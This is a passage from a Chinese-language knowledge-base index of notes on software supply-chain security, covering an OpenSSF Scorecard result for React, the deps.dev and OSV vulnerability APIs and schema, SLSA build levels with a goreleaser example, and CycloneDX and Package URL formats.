&quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project has an OpenSSF (formerly CII) Best Practices Badge.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#cii-best-practices&quot;,\n              },\n            &quot;score&quot;: &quot;2&quot;,\n            &quot;reason&quot;: &quot;badge detected: in_progress&quot;,\n            &quot;details&quot;: [],\n          },\n          {\n            &quot;name&quot;: &quot;Signed-Releases&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project cryptographically signs release artifacts.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#signed-releases&quot;,\n              },\n            &quot;score&quot;: &quot;0&quot;,\n            &quot;reason&quot;: &quot;0 out of 3 artifacts are signed or have provenance&quot;,\n            &quot;details&quot;:\n              [\n                &quot;Warn: release artifact v16.6.3 does not have provenance: api.github.com/repos/facebook/react/releases/13984567&quot;,\n                &quot;Warn: release artifact v16.6.3 not signed: api.github.com/repos/facebook/react/releases/13984567&quot;,\n                &quot;Warn: release artifact v16.6.1 does not have provenance: api.github.com/repos/facebook/react/releases/13867150&quot;,\n                &quot;Warn: release artifact v16.6.1 not signed: api.github.com/repos/facebook/react/releases/13867150&quot;,\n                &quot;Warn: release artifact v16.6.0 does not have provenance: api.github.com/repos/facebook/react/releases/13620514&quot;,\n                &quot;Warn: release artifact v16.6.0 not signed: api.github.com/repos/facebook/react/releases/13620514&quot;,\n              ],\n          },\n          {\n            &quot;name&quot;: &quot;Packaging&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project is published as a package that others can easily download, install, easily update, and uninstall.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#packaging&quot;,\n              },\n            &quot;score&quot;: &quot;-1&quot;,\n            &quot;reason&quot;: &quot;no published package detected&quot;,\n            &quot;details&quot;: [&quot;Warn: no GitHub publishing workflow detected&quot;],\n          },\n          {\n            &quot;name&quot;: &quot;Dangerous-Workflow&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project&#039;s GitHub Action workflows avoid dangerous patterns.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#dangerous-workflow&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;no dangerous workflow patterns detected&quot;,\n            &quot;details&quot;: [],\n          },\n          {\n            &quot;name&quot;: &quot;Security-Policy&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project has published a security policy.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#security-policy&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;security policy file detected&quot;,\n            &quot;details&quot;:\n              [\n                &quot;Info: Found linked content in security policy: SECURITY.md&quot;,\n                &quot;Info: Found text in security policy: SECURITY.md&quot;,\n                &quot;Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md&quot;,\n                &quot;Info: security policy detected in current repo: SECURITY.md&quot;,\n              ],\n          },\n          {\n            &quot;name&quot;: &quot;Token-Permissions&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project&#039;s workflows follow the principle of least privilege.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#token-permissions&quot;,\n              },\n            &quot;score&quot;: &quot;0&quot;,\n            &quot;reason&quot;: &quot;non read-only tokens detected in GitHub workflows&quot;,\n            &quot;details&quot;:\n              [\n                &quot;Warn: no topLevel permission defined: .github/workflows/commit_artifacts.yml:1: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: no topLevel permission defined: .github/workflows/devtools_check_repro.yml:1: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/devtools_check_repro.yml/main,\n              ],\n          },\n          {\n            &quot;name&quot;: &quot;License&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project has defined a license.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#license&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;license file detected&quot;,\n            &quot;details&quot;: [&quot;Info: : LICENSE:1&quot;],\n          },\n          {\n            &quot;name&quot;: &quot;Binary-Artifacts&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project has generated executable (binary) artifacts in the source repository.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#binary-artifacts&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;no binaries found in the repo&quot;,\n            &quot;details&quot;: [],\n          },\n          {\n            &quot;name&quot;: &quot;Pinned-Dependencies&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project has declared and pinned the dependencies of its build process.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#pinned-dependencies&quot;,\n              },\n            &quot;score&quot;: &quot;7&quot;,\n            &quot;reason&quot;: &quot;dependency not pinned by hash detected -- score normalized to 7&quot;,\n            &quot;details&quot;:\n              [\n                &quot;Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/commit_artifacts.yml:11: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/commit_artifacts.yml:17: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/commit_artifacts.yml:107: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/commit_artifacts.yml:116: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/commit_artifacts.yml:121: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: third-party GitHubAction not pinned by hash: .github/workflows/commit_artifacts.yml:127: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/commit_artifacts.yml/main,\n                &quot;Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/devtools_check_repro.yml:12: update your workflow using app.stepsecurity.io/secureworkflow/facebook/react/devtools_check_repro.yml/main,\n                &quot;Warn: npmCommand not pinned by hash: .github/workflows/commit_artifacts.yml:16&quot;,\n                &quot;Info: Dockerfile dependencies are pinned&quot;,\n                &quot;Info: no insecure (not pinned by hash) dependency downloads found in Dockerfiles&quot;,\n                &quot;Info: no insecure (not pinned by hash) dependency downloads found in shell scripts&quot;,\n              ],\n          },\n          {\n            &quot;name&quot;: &quot;Dependency-Update-Tool&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project uses a dependency update tool.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#dependency-update-tool&quot;,\n              },\n            &quot;score&quot;: &quot;10&quot;,\n            &quot;reason&quot;: &quot;update tool detected&quot;,\n            &quot;details&quot;: [&quot;Info: Dependabot detected&quot;],\n          },\n          {\n            &quot;name&quot;: &quot;SAST&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project uses static code analysis.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#sast&quot;,\n              },\n            &quot;score&quot;: &quot;0&quot;,\n            &quot;reason&quot;: &quot;SAST tool is not run on all commits -- score normalized to 0&quot;,\n            &quot;details&quot;:\n              [\n                &quot;Warn: 0 commits out of 30 are checked with a SAST tool&quot;,\n                &quot;Warn: CodeQL tool not detected&quot;,\n              ],\n          },\n          {\n            &quot;name&quot;: &quot;Branch-Protection&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the default and release branches are protected with GitHub&#039;s branch protection settings.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#branch-protection&quot;,\n              },\n            &quot;score&quot;: &quot;1&quot;,\n            &quot;reason&quot;: &quot;branch protection is not maximal on development and all release branches&quot;,\n            &quot;details&quot;:\n              [\n                &quot;Info: &#039;force pushes&#039; disabled on branch &#039;main&#039;&quot;,\n                &quot;Info: &#039;allow deletion&#039; disabled on branch &#039;main&#039;&quot;,\n                &quot;Warn: no status checks found to merge onto branch &#039;main&#039;&quot;,\n                &quot;Warn: number of required reviewers is only 0 on branch &#039;main&#039;&quot;,\n                &quot;Warn: codeowner review is not required on branch &#039;main&#039;&quot;,\n                &quot;Warn: branch protection not enabled for branch &#039;17.0.2&#039;&quot;,\n                &quot;Warn: branch protection not enabled for branch &#039;17.0.1&#039;&quot;,\n                &quot;Warn: branch protection not enabled for branch &#039;17.0.0-dev&#039;&quot;,\n                &quot;Warn: branch protection not enabled for branch &#039;old-majors&#039;&quot;,\n                &quot;Info: &#039;force pushes&#039; disabled on branch &#039;16.3-dev&#039;&quot;,\n                &quot;Info: &#039;allow deletion&#039; disabled on branch &#039;16.3-dev&#039;&quot;,\n                &quot;Warn: no status checks found to merge onto branch &#039;16.3-dev&#039;&quot;,\n                &quot;Warn: number of required reviewers is only 0 on branch &#039;16.3-dev&#039;&quot;,\n                &quot;Warn: codeowner review is not required on branch &#039;16.3-dev&#039;&quot;,\n              ],\n          },\n          {\n            &quot;name&quot;: &quot;Fuzzing&quot;,\n            &quot;documentation&quot;:\n              {\n                &quot;shortDescription&quot;: &quot;Determines if the project uses fuzzing.&quot;,\n                &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#fuzzing&quot;,\n              },\n            &quot;score&quot;: &quot;0&quot;,\n            &quot;reason&quot;: &quot;project is not fuzzed&quot;,\n            &quot;details&quot;: [],\n          },\n        ],\n      &quot;overallScore&quot;: 6.1,\n      &quot;metadata&quot;: [],\n      &quot;date&quot;: &quot;2022-11-21T00:00:00Z&quot;,\n    },\n}\n响应结构如下\n@startjson\n{\n    &quot;projectKey&quot;: {\n        &quot;id&quot;: &quot;github.com/facebook/react&quot;\n    },\n    &quot;openIssuesCount&quot;: &quot;1235&quot;,\n    &quot;starsCount&quot;: &quot;205557&quot;,\n    &quot;forksCount&quot;: &quot;42814&quot;,\n    &quot;license&quot;: &quot;MIT&quot;,\n    &quot;description&quot;: &quot;The library for web and native user interfaces&quot;,\n    &quot;homepage&quot;: &quot;react.dev&quot;,\n    &quot;scorecard&quot;: {\n        &quot;repository&quot;: {\n            &quot;name&quot;: &quot;github.com/facebook/react&quot;,\n            &quot;commit&quot;: &quot;2655c9354d8e1c54ba888444220f63e836925caa&quot;\n        },\n        &quot;scorecard&quot;: {\n            &quot;version&quot;: &quot;v4.8.0-75-gef79b94&quot;,\n            &quot;commit&quot;: &quot;ef79b9487d8f8bf6fca7b0bafc8c55049d925403&quot;\n        },\n        &quot;checks&quot;: [\n            {\n                &quot;name&quot;: &quot;Code-Review&quot;,\n                &quot;documentation&quot;: {\n                    &quot;shortDescription&quot;: &quot;Determines if the project requires code review before pull requests (aka merge requests) are merged.&quot;,\n                    &quot;url&quot;: &quot;github.com/ossf/scorecard/blob/ef79b9487d8f8bf6fca7b0bafc8c55049d925403/docs/checks.md#code-review&quot;\n                },\n                &quot;score&quot;: &quot;8&quot;,\n                &quot;reason&quot;: &quot;21 out of last 24 changesets reviewed before merge -- score normalized to 8&quot;,\n                &quot;details&quot;: []\n            }\n        ],\n        &quot;overallScore&quot;: 6.1,\n        &quot;metadata&quot;: [],\n        &quot;date&quot;: &quot;2022-11-21T00:00:00Z&quot;\n    }\n}\n@endjson\nGetAdvisory\nGetAdvisory 返回有关 OSV 托管的安全公告的信息\nGET /v3alpha/advisories/{advisoryKey.id}\n\n参数\n\nadvisoryKey.id: string\n\nOSV 标识符\n\n\n\n示例，/v3alpha/advisories/GHSA-2qrg-x229-3v8q\n{\n    &quot;advisoryKey&quot;: {\n        &quot;id&quot;: &quot;GHSA-2qrg-x229-3v8q&quot;\n    },\n    &quot;url&quot;: &quot;osv.dev/vulnerability/GHSA-2qrg-x229-3v8q&quot;,\n    &quot;title&quot;: &quot;Deserialization of Untrusted Data in Log4j&quot;,\n    &quot;aliases&quot;: [\n        &quot;CVE-2019-17571&quot;\n    ],\n    &quot;cvss3Score&quot;: 9.8,\n    &quot;cvss3Vector&quot;: &quot;CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&quot;\n}\n响应结构如下\n@startjson\n{\n    &quot;advisoryKey&quot;: {\n        &quot;id&quot;: &quot;GHSA-2qrg-x229-3v8q&quot;\n    },\n    &quot;url&quot;: &quot;osv.dev/vulnerability/GHSA-2qrg-x229-3v8q&quot;,\n    &quot;title&quot;: &quot;Deserialization of Untrusted Data in Log4j&quot;,\n    &quot;aliases&quot;: [\n        &quot;CVE-2019-17571&quot;\n    ],\n    &quot;cvss3Score&quot;: 9.8,\n    &quot;cvss3Vector&quot;: &quot;CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&quot;\n}\n@endjson\n响应字段说明\n\nadvisoryKey: object\n\n安全公告的标识符，规范化的 id，可能与请求中的参数不一样。\n\n\nurl: string\n\n安全公告的 URL。\n\n\ntitle: string\n\n描述。\n\n\naliases[]: string[]\n\n别名，如 CVE 编号。\n\n\ncvss3Score: number\n\nCVSS v3 分数，在 [0,10] 范围内，分数越高表示严重程度越高。\n\n\ncvss3Vector: string\n\nCVSS v3 矢量字符串，描述在不同维度上的严重性。\n\n\n\nQuery\n查询有关多个包版本的信息，这些信息可以通过名称、包内容哈希或两者指定。\nGET /v3alpha/query\n\n参数\n\nhash.type: string\n\n哈希算法，MD5、SHA1、SHA256、SHA512 之一\n\n\nhash.value: string\n\n哈希值。\n\n\nversionKey.system: string\n\n包所属的生态\n\n\nversionKey.name: string\n\n包名\n\n\nversionKey.version: string\n\n包的版本\n\n\n\n示例，/v3alpha/query?hash.type=SHA1&amp;hash.value=ulXBPXrC%2fUTfnMgHRFVxmjPzdbk%3d\n参考\n\nsecurity.googleblog.com/2023/04/announcing-depsdev-api-critical.html\ndocs.deps.dev/api/v3alpha/index.html\n"},"archived/projects/supply-chains/Open-Source-Vulnerability-Database-(OSV)":{"title":"Open Source Vulnerability Database (OSV)","links":[],"tags":["osv"],"content":"介绍\nOSV 是 Open Source Security 团队的开源项目，目标是作为开源软件安全的一个基础架构平台。OSV 通过聚合各个软件生态下的漏洞数据，并统一成 OpenSSF Vulnerability Format 中定义的数据格式。该平台目前还提供免费的查询接口供开发者使用，并通过二分搜索和版本分析，保障查询结果的准确性。\n\n漏洞数据源\n目前有部分漏洞库，已经原生支持 OpenSSF Vulnerability Format 格式：\n\nGitHub Advisory Database (CC-BY 4.0)\nPyPI Advisory Database (CC-BY 4.0)\nGo Vulnerability Database (CC-BY 4.0)\nRust Advisory Database (CC0 1.0)\nGlobal Security Database (CC0 1.0)\nOSS-Fuzz (CC-BY 4.0)\n\n为了转换 Debian Security Advisories 和 Alpine SecDB 生态下的漏洞信息，OSV 还维护了对应的转换工具。截至目前，OSV 覆盖的软件生态很丰富，包括 Android、crates.io、Debian GNU/Linux、GitHub Actions、Go、Hex、Linux kernel、Maven 等\nDump\nOSV 将聚合后的数据存放在 GCS 中 gs://osv-vulnerabilities，如果想 Dump OSV 聚合后的数据，可使用 gsutil 工具『可通过 pip install gsutil』进行下载，例如对于 Mavne 生态可通过下面的命令进行下载\n# Or download over HTTP via osv-vulnerabilities.storage.googleapis.com/Maven/all.zip\ngsutil cp gs://osv-vulnerabilities/Maven/all.zip .\n\n可在 gs://osv-vulnerabilities.storage.googleapis.com/ecosystems.txt 查看可用的 Ecosystem。\n架构\n\n根据 Architecture | OSV 的介绍，OSV 服务部署在 Google Cloud Platform 上，包含以下组件：\n\nCloud Datastore\n\n漏洞数据都存储在 Datastore  |  Google Cloud，模型定义见 osv.dev/models.py at master · google/osv.dev · GitHub\n\n\nGoogle Kubernetes Engine (GKE)\n\n通过 GKE 运行 Workers，Workers 从 Pub/Sub for Application &amp; Data Integration  |  Google Cloud 中获取任务，并通过 The Container Security Platform | gVisor 提供容器保护\n\n\nCloud Run / Cloud Endpoints\n\nAPI 接口服务则通过 Cloud Run: Container to production in seconds  |  Google Cloud 运行，并通过 Cloud Endpoints  |  Google Cloud 对外开放。\n\n\nApp Engine\n\nApp Engine 维持 osv.dev 的 Web 服务，并通过定时任务给 Workers 下发任务『可能是重复的』，用于分配 OSV ID，并适时公布漏洞数据到 Datasource 中。\n\n\n\n使用\n格式规范\n{\n\t&quot;schema_version&quot;: &quot;string&quot;,\n\t&quot;id&quot;: &quot;string&quot;,\n\t&quot;modified&quot;: &quot;string&quot;,\n\t&quot;published&quot;: &quot;string&quot;,\n\t&quot;withdrawn&quot;: &quot;string&quot;,\n\t&quot;aliases&quot;: [ &quot;string&quot; ],\n\t&quot;related&quot;: [ &quot;string&quot; ],\n\t&quot;summary&quot;: &quot;string&quot;,\n\t&quot;details&quot;: &quot;string&quot;,\n\t&quot;severity&quot;: [ {\n\t\t&quot;type&quot;: &quot;string&quot;,\n\t\t&quot;score&quot;: &quot;string&quot;\n\t} ],\n\t&quot;affected&quot;: [ {\n\t\t&quot;package&quot;: {\n\t\t\t&quot;ecosystem&quot;: &quot;string&quot;,\n\t\t\t&quot;name&quot;: &quot;string&quot;,\n\t\t\t&quot;purl&quot;: &quot;string&quot;\n\t\t},\n\t\t&quot;ranges&quot;: [ {\n\t\t\t&quot;type&quot;: &quot;string&quot;,\n\t\t\t&quot;repo&quot;: &quot;string&quot;,\n\t\t\t&quot;events&quot;: [ {\n\t\t\t\t&quot;introduced&quot;: &quot;string&quot;,\n\t\t\t\t&quot;fixed&quot;: &quot;string&quot;,\n\t\t\t\t&quot;last_affected&quot;: &quot;string&quot;,\n\t\t\t\t&quot;limit&quot;: &quot;string&quot;\n\t\t\t} ],\n\t\t\t&quot;database_specific&quot;: { &quot;see description&quot; }\n\t\t} ],\n\t\t&quot;versions&quot;: [ &quot;string&quot; ],\n\t\t&quot;ecosystem_specific&quot;: { &quot;see description&quot; },\n\t\t&quot;database_specific&quot;: { &quot;see description&quot; }\n\t} ],\n\t&quot;references&quot;: [ {\n\t\t&quot;type&quot;: &quot;string&quot;,\n\t\t&quot;url&quot;: &quot;string&quot;\n\t} ],\n\t&quot;credits&quot;: [ {\n\t\t&quot;name&quot;: &quot;string&quot;,\n\t\t&quot;contact&quot;: [ &quot;string&quot; ]\n\t} ],\n\t&quot;database_specific&quot;: { &quot;see description&quot; }\n}\ndatabase_specific 字段由内部数据库定义并提供的额外数据对象，具体内容不固定。\n示例\ncurl -X POST -d \\\n  &#039;{&quot;version&quot;: &quot;2.4.1&quot;,\n    &quot;package&quot;: {&quot;name&quot;: &quot;jinja2&quot;, &quot;ecosystem&quot;: &quot;PyPI&quot;}}&#039; \\\n  &quot;api.osv.dev/v1/query&quot;\n@startjson\n{\n  &quot;schema_version&quot;: &quot;1.3.0&quot;,\n  &quot;id&quot;: &quot;GHSA-c3g4-w6cv-6v7h&quot;,\n  &quot;modified&quot;: &quot;2022-04-01T13:56:42Z&quot;,\n  &quot;published&quot;: &quot;2022-04-01T13:56:42Z&quot;,\n  &quot;aliases&quot;: [ &quot;CVE-2022-27651&quot; ],\n  &quot;summary&quot;: &quot;Non-empty default inheritable capabilities for linux container in Buildah&quot;,\n  &quot;details&quot;: &quot;A bug was found in Buildah where containers were created ...&quot;,\n  &quot;affected&quot;: [\n    {\n      &quot;package&quot;: {\n        &quot;ecosystem&quot;: &quot;Go&quot;,\n        &quot;name&quot;: &quot;github.com/containers/buildah&quot;\n      },\n      &quot;ranges&quot;: [\n        {\n          &quot;type&quot;: &quot;SEMVER&quot;,\n          &quot;events&quot;: [\n            {\n              &quot;introduced&quot;: &quot;0&quot;\n            },\n            {\n              &quot;fixed&quot;: &quot;1.25.0&quot;\n            }\n          ]\n        }\n      ]\n    }\n  ],\n  &quot;references&quot;: [\n    {\n      &quot;type&quot;: &quot;WEB&quot;,\n      &quot;url&quot;: &quot;github.com/containers/buildah/commit/...&quot;\n    },\n    {\n      &quot;type&quot;: &quot;PACKAGE&quot;,\n      &quot;url&quot;: &quot;github.com/containers/buildah&quot;\n    }\n  ]\n}\n@endjson\nOpenAPI 接口\nAPI 接口一共有 3 个\n\napi.osv.dev/v1/query\n\n查询单个 package 的漏洞\n请求参数格式如下，commit、 version + package.name + package.ecosystem 或 package.purl 任选一种即可。\n\n\n\n{\n\t&quot;commit&quot;: &quot;string&quot;,\n\t&quot;version&quot;: &quot;string&quot;,\n\t&quot;package&quot;: {\n\t\t&quot;name&quot;: &quot;string&quot;,\n\t\t&quot;ecosystem&quot;: &quot;string&quot;,\n\t\t&quot;purl&quot;: &quot;string&quot;\n\t}\n}\n\napi.osv.dev/v1/querybatch\n\n同时查询多个 package 的漏洞『一次请求最多 1000 个』，请求参数格式与前者相同，只是组合成数组的形式。此接口不会返回某个漏洞完整的 OSV 漏洞规范中定义的数据，而是主要返回 OSV ID 字段，因此需要配合下一个接口获取更详细的漏洞信息。\n\n\napi.osv.dev/v1/vulns/{id}\n\n根据 OSV 的漏洞 ID 查询某个漏洞\n\n\n\n参考\n\nOpen Source Vulnerability format - Open Source Vulnerability schema (ossf.github.io)\nGoogle Online Security Blog: Know, Prevent, Fix: A framework for shifting the discussion around vulnerabilities in open source (googleblog.com)\nIntroduction to OSV | OSV\n"},"archived/projects/supply-chains/Supply-chain-Levels-for-Software-Artifacts-(-SLSA)":{"title":"Supply-chain Levels for Software Artifacts ( SLSA)","links":[],"tags":["supply-chain","slsa"],"content":"SLSA『读作 salsa』，全称 Supply-chain Levels for Software Artifacts，是 OpenSSF 推出的一项软件供应链安全标准，框架，和控制清单，用于防止包篡改、提高完整性以及保护包和基础设施『如包管理平台和构建平台』。\n使整个 SDL 流程的任何环节从『足够安全』到尽可能具有弹性。\n软件开发的任何过程都有可能引入供应链安全问题，随着系统越来越复杂，需要坚实的基础和随系统改变的安全方案才能更好的应对新的威胁。SLSA 就是构建此坚实基础的标准方案。\nSLSA 具体是做什么的\n软件供应链安全里，SBOM 是软件的物料清单，告诉使用者，此软件中使用了哪些依赖等信息。类比之下，可以理解为从食品加工厂生产的食物上注明的配料表。而 SLSA 则可以类比为告诉你，用于加工该食品等各个配料已经食品本身，是以安全的方式进行加工生产的，例如干净卫生的加工环节，外卖袋子上防篡改的密封胶带，确保你在食用时，食物未被他人动过。\n所以 SLSA 也是一套信任机制，确保软件成分的完整性和可验证性。这意味着，作为软件使用者，你不仅知道软件中有什么（依赖），还可以确认它是不是真的只包含这些（依赖），以及是否是来自可信平台构建完成的，而没有被掺杂进其它恶意代码。这可以避免以下安全风险：\n\n代码修改（通过在源代码开始构建前，向代码添加防篡改『标签』）\n上传的软件不是由预期（可信）的 CI/CD 平台构建的（通过使用平台相关的标签来标记软件，显示哪个构建平台创建了它）\n针对构建平台的威胁（通过为构建平台服务商提供 『构建过程』的最佳实践）\n\nProvenance\nProvenance 是 SLSA 引入的一个重要概念，它的作用就是为了实现软件供应链中的完整性和可验证性。Provenance 提供了一组元数据，描述软件的出处，它的作用如下\n\n使用者可以验证软件是否是根据预期构建的\n如果需要，其他人可以重新构建该软件\n\nProvenance 和另一个概念 Attestation 是相辅相成的，它存储了关于软件的经过身份验证的签名（元数据）。它的结构描述如下图：\n\n下图是一个示例\n\n而 Bundle 则是 Attestation 的合集，Storage/Lookup 表示 Bundle/Attestation 的存储位置或者告知使用者如何获取它们。\n各个部分的推荐构建方式见下表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nComponentRecommendationEnvelopeDSSE (ECDSA over NIST P-256 (or stronger) and SHA-256.)Statementin-toto attestationsPredicateChoose as appropriate, i.e.; Provenance, SPDX, other predicates defined by third-parties. If none are a good fit, invent a new oneBundleJSON Lines, see attestation bundleStorage/LookupTBD\n\nProvenance 的构建标准见 SLSA • Distributing provenance。\n\n安全级别\nSLSA 为供应链制定了一项 安全级别 标准，共分为 4 级\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrack/LevelRequirementsFocusBuild L0(none)(n/a)Build L1Provenance showing how the package was builtMistakes, documentationBuild L2Signed provenance, generated by a hosted build platformTampering after the buildBuild L3Hardened build platformTampering during the build\n各个级别标注了说需要达到杜条件，已经所专注地保护的软件供应链阶段。\n示例\n官网给出了一个使用 Docker 下的 curl 的例子，描述它是如何构建并达到 SLSA 4 安全级别的。\n如果使用 Github，可以通过 Gtihub Action SLSA releaser 为开源项目构建 SLSA 3，如果是私有仓库使用该 Action 则会报错\nRepository is private. The workflow has halted in order to keep the repository name from being exposed in the public transparency log.\n\n下面以开发者视角，在一个 Go 编写的项目展示它的使用，首先在项目根目录新增一个 .slsa-goreleaser.yml 文件。\n# Version for this file.\nversion: 1\n \n# (Optional) List of env variables used during compilation.\nenv:\n  - GO111MODULE=on\n \n# The OS to compile for. `GOOS` env variable will be set to this value.\ngoos: linux\n \n# The architecture to compile for. `GOARCH` env variable will be set to this value.\ngoarch: amd64\n \n# (Optional) Entrypoint to compile.\nmain: ./main.go\n \n# Binary output name.\n# {{ .Os }} will be replaced by goos field in the config file.\n# {{ .Arch }} will be replaced by goarch field in the config file.\nbinary: binary-{{ .Os }}-{{ .Arch }}\n在 Action 页面选择 SLSA Go releaser，点击 Configure 后提交合并即可，这个示例不需要做额外配置。\n\n下面创建一个 Releases，触发 SLSA Go releaser\n\n构建完成后，生成了这 3 个文件，开发者可将这些文件上传至 Releases 中。\n\n目前 SLSA releaser 还处于开发阶段，功能尚不完善，可持续关注。"},"archived/projects/supply-chains/software-component-analysis/sbom/CycloneDX":{"title":"CycloneDX","links":[],"tags":["cyclonedx","bom"],"content":"CyclonedX 是由 OWASP 推出的 SBOM 规范，并提供了一系列工具来辅助开源项目构建自己的 SBOM 文件，支持多种格式，包括 xml、json、protobuf。在官方仓库中提供了该格式在不同方面的应用 示例，\n下图为 CycloneDX 的抽象模型。\n\nCycloneDX 的设计宣称，除了基本的 SBOM 能力，还具备其他 BOM 功能。它们分别是：\n\nCycloneDX - Software-as-a-Service BOM (SaaSBOM)\n\n支持云原生应用程序的清单服务、端点以及数据流和分类，由 services 部分提供支持。\n\n\nCycloneDX - Vulnerability Exploitability eXchange (VEX)\n\n支持在使用它们的软件的上下文中传达漏洞信息，如某个依赖组件存在的漏洞，漏洞是否会影响当前软件等。\n\n\nCycloneDX - Hardware Bill of Materials (HBOM)\n\n支持硬件物料清单，可列举物联网、ICS 和其他类型的嵌入式和连接设备的库存硬件组件。\n\n\nCycloneDX - Operations Bill of Materials (OBOM)\n\n支持运行时环境、配置和附加依赖项的全栈清单，可存放于 metadata.component.properties，见示例 Standalone 或示例 Decoupled，OBOM 由 BSIMM 标准引入。\n\n\nCycloneDX - Vulnerability Disclosure Report (VDR)\n\n传递影响组件和服务的已知和未知漏洞。\n\n\nCycloneDX BOM-Link\n\n从其他系统或其他 BOM 中引用组件、服务或 BOM 中的漏洞。\n\n\nCycloneDX - Bill of Vulnerabilities\n\n在系统和漏洞情报来源之间共享漏洞数据。\n\n\n\nPackage URL(PURL)\nPackage URL 是一类标准，用于统一表示开源软件在开源软件宇宙中的位置。例如使用了什么语言，在哪个仓库平台，软件名称，版本等信息，它的形式和 URL 很类似，在 2018 年的 FOSDEM 会议上被提出。\nscheme:type/namespace/name@version?qualifiers#subpath\n各组成部分的定义如下：\n\nscheme：固定为 pkg，为未来的拓展做保留，必须\ntype：包的类型或者来源，如 maven、npm、nuget、gem、pypi 等，必须\nnamespace：名称空间，例如 Maven 中的 groupid，Docker 镜像中的所有者，Github 上的用户名或组织名，可选\nname：包的名称，必须\nversion：版本号，可选\nqualifiers：额外的元数据，例如操作系统，架构平台等，可选\nsubpath：相对于 namespace 的子路径，可选\n\n一些示例\npkg:bitbucket/birkenfeld/pygments-main@244fd47e07d1014f0aed9c\n \npkg:deb/debian/curl@7.50.3-1?arch=i386&amp;distro=jessie\n \npkg:docker/cassandra@sha256:244fd47e07d1004f0aed9c\npkg:docker/customer/dockerimage@sha256:244fd47e07d1004f0aed9c?repository_url=gcr.io\n \npkg:gem/jruby-launcher@1.1.2?platform=java\npkg:gem/ruby-advisory-db-check@0.12.4\n \npkg:github/package-url/purl-spec@244fd47e07d1004f0aed9c\n 